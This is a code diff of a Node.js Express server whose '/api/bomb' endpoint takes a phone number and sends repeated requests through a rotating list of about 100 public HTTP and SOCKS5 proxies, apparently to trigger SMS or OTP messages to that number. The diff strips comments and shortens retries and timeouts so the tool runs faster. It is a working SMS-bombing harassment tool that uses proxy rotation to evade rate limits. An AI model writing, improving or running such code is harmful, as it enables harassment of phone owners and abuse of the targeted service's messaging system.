@@ -8,15 +8,10 @@ const path = require('path');
 const app = express();
 app.use(cors());
 app.use(express.json());
-
-// Static Files (HTML) ကို public folder ထဲကနေ ဖတ်ခိုင်းမယ်
 app.use(express.static(path.join(__dirname, 'public')));
 
-// ==========================================
-// 100 PROXIES (Direct Load)
-// ==========================================
+// 100 PROXIES
 const proxies = [
-    // --- HTTP / HTTPS ---
     "http://80.74.54.148:3128", "http://142.93.202.130:3128", "http://34.43.46.91:443",
     "http://103.178.160.149:3128", "http://103.158.210.21:8090", "http://165.154.162.73:8888",
     "http://8.213.151.128:3128", "http://190.167.38.11:999", "http://47.91.104.88:3128",
@@ -31,8 +26,6 @@ const proxies = [
     "http://140.238.32.108:3128", "http://172.212.125.72:3128", "http://89.43.135.42:8080",
     "http://165.101.25.186:8080", "http://119.93.94.108:8080", "http://122.54.141.104:5050",
     "http://31.220.78.244:80", "http://103.17.215.9:8089", "http://4.144.146.21:80",
-    
-    // --- SOCKS4 / SOCKS5 ---
     "socks5://45.74.31.40:13320", "socks5://184.178.172.11:4145", "socks5://94.183.150.152:1080",
     "socks5://50.222.120.243:1080", "socks5://142.54.237.34:4145", "socks5://45.61.129.165:9050",
     "socks5://192.111.137.37:18762", "socks5://195.62.49.84:10808", "socks5://98.188.47.132:4145",
@@ -73,12 +66,11 @@ app.get('/api/bomb', async (req, res) => {
     const phone = req.query.phone;
     if (!phone) return res.status(400).json({ error: 'Phone number required' });
 
-    const maxRetries = 5; // Proxy ၅ ခု ကျသွားရင် ရပ်မယ်
+    const maxRetries = 3; // ၃ ခုပဲ စမ်းမယ် (မြန်အောင်)
     let attempts = 0;
     let isSuccess = false;
 
     while (attempts < maxRetries && !isSuccess) {
-        // တစ်ခုပြီးတစ်ခု လှည့်သုံးမယ်
         const proxyUrl = proxies[proxyIndex % proxies.length];
         proxyIndex++;
 
@@ -104,27 +96,24 @@ app.get('/api/bomb', async (req, res) => {
                     "User-Agent": "okhttp/4.9.3",
                     "Accept-Language": "my"
                 },
-                timeout: 7000, // ၇ စက္ကန့် ကျော်ရင် Proxy ကျတယ်လို့ သတ်မှတ်
+                timeout: 3000, // ၃ စက္ကန့်ပဲ စောင့်မယ် (အရင်က ၇ စက္ကန့်)
                 validateStatus: () => true 
             });
 
-            // 200 ဒါမှမဟုတ် 500 ဆိုရင် အောင်မြင်တယ်
             if (response.status === 200 || response.status === 500) {
                 isSuccess = true;
-                return res.json({ status: 'success', proxy_used: proxyIndex, attempts: attempts + 1 });
+                return res.json({ status: 'success', proxy_used: proxyIndex });
             }
         } catch (error) {
-            // Proxy ကျရင် ဒီနေရာမှာ Error တက်မယ်၊ ပြီးရင် Loop က နောက်တစ်ခုကို ဆက်သွားမယ်
+            // Proxy ကျရင် ဆက်သွားမယ်
         }
         
         attempts++;
     }
 
-    // Proxy ၅ ခု ကျသွားလို့ မရခဲ့ရင်
     return res.status(502).json({ status: 'all_proxies_failed' });
 });
 
-// Frontend (HTML) ကို ပို့ပေးမယ့် Route
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
